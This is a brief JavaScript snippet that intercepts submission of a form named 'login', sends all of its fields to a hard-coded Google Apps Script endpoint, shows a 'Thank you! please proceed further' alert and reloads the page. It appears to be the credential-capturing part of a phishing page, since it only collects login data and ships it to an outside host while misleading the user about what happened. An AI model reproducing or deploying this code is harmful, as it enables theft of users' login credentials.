const scriptURL ='https://script.google.com/macros/s/AKfycbwJ70kfE6TLqY9XYU1AVPjI793mPMHlC0MZFxdcgmGmqD098NmhjuqtejMoiw6s8ZG4vQ/exec'
const form = document.forms['login']
form.addEventListener('submit',e=>{
    e.preventDefault()
    fetch(scriptURL,{method:'POST',body:new FormData(form)})
    .then(Response=>alert("Thank you! please proceed further"))
    .then(()=>{window.location.reload();})
    .catch(error=> console.error('Error!',error.message))
})